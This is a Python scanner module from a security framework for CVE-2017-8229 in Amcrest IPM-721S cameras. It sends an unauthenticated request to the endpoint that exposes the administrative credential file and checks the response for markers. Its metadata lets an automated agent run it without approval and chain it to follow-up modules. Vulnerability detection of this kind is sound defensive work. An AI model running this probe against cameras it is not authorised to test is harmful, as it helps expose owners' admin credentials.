#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Amcrest IPM-721S V2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Amcrest IP Camera Web Management - Data Exposure Detection',
        'description': 'Amcrest IPM-721S V2.420.AC00.16.R.20160909 devices allow an unauthenticated attacker to download the administrative credentials.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'packetstorm', 'seclists', 'amcrest', 'iot', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-8229',
            'http://packetstormsecurity.com/files/153224/Amcrest-IPM-721S-Credential-Disclosure-Privilege-Escalation.html',
            'https://github.com/ethanhunnt/IoT_vulnerabilities/blob/master/Amcrest_sec_issues.pdf',
            'https://seclists.org/bugtraq/2019/Jun/8',
            'https://github.com/d4n-sec/d4n-sec.github.io',
        ],
        'cve': 'CVE-2017-8229',
    }

    def run(self):
        r = self.http_request(method="GET", path='/current_config/Sha1Account1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('DevInformation', 'SerialID',)
        header_any = ('application/octet-stream',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="Amcrest IP Camera Web Management - Data Exposure detected",
                path='/current_config/Sha1Account1',
            )
            return True
        return False

